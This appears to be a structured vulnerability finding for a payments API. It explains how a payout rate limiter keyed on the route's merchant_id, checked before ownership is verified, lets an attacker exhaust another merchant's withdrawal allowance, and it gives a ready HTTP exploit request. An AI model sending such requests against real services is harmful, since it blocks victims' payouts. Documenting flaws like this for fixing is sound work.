diagnosis: The throttle computes its rate limit key using the merchant_id route parameter before object-level permissions verify whether the caller owns that merchant. A malicious actor can issue repeated payout attempts referencing another merchant's ID, exhausting the victim merchant's 3/hour withdrawal allowance.
exploit_request:
POST /api/merchants/881/payouts/execute/ HTTP/1.1
Host: payments.hub.com
Authorization: Bearer <unauthorized_user_jwt>
Content-Type: application/json

{"amount": 100.00}
